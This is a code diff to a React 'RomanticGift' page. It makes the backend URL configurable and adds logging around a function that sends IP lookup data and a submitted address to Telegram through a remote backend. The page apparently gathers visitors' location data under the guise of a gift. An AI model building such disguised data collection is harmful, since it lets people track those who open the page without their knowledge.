@@ -10,6 +10,9 @@ const RomanticGift = () => {
   const [showMusicPrompt, setShowMusicPrompt] = useState(true);
   const audioRef = useRef(null);
 
+  // MUHIM: Environment variable'dan backend URL olish
+  const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://romantic-gift-backend.onrender.com/api/notify';
+
   useEffect(() => {
     const getIPData = async () => {
       try {
@@ -57,11 +60,10 @@ const RomanticGift = () => {
   };
 
   const sendDataToTelegram = async (data) => {
-    // Backend server URL - change this to your deployed backend URL
-    const BACKEND_URL = 'http://localhost:5000/api/notify';
-    
     try {
-      await fetch(BACKEND_URL, {
+      console.log('Sending to:', BACKEND_URL); // Debug uchun
+      
+      const response = await fetch(BACKEND_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -76,8 +78,11 @@ const RomanticGift = () => {
           timestamp: data.timestamp
         })
       });
+      
+      const result = await response.json();
+      console.log('Backend response:', result); // Debug uchun
     } catch (error) {
-      console.log('Backend error:', error);
+      console.error('Backend error:', error);
     }
   };
 
@@ -256,8 +261,6 @@ const RomanticGift = () => {
               >
                 <span className="drop-shadow-md">Send my address 💌</span>
               </button>
-              
-
             </div>
           </div>
 
@@ -387,7 +390,6 @@ const RomanticGift = () => {
             ))}
 
             <div className="backdrop-blur-2xl bg-gradient-to-br from-pink-500/40 to-rose-600/40 rounded-3xl p-12 shadow-2xl border-2 border-white/40 relative overflow-hidden">
-              {/* Decorative elements */}
               <div className="absolute top-0 left-0 w-32 h-32 bg-white/10 rounded-full blur-3xl"></div>
               <div className="absolute bottom-0 right-0 w-40 h-40 bg-pink-300/20 rounded-full blur-3xl"></div>
               
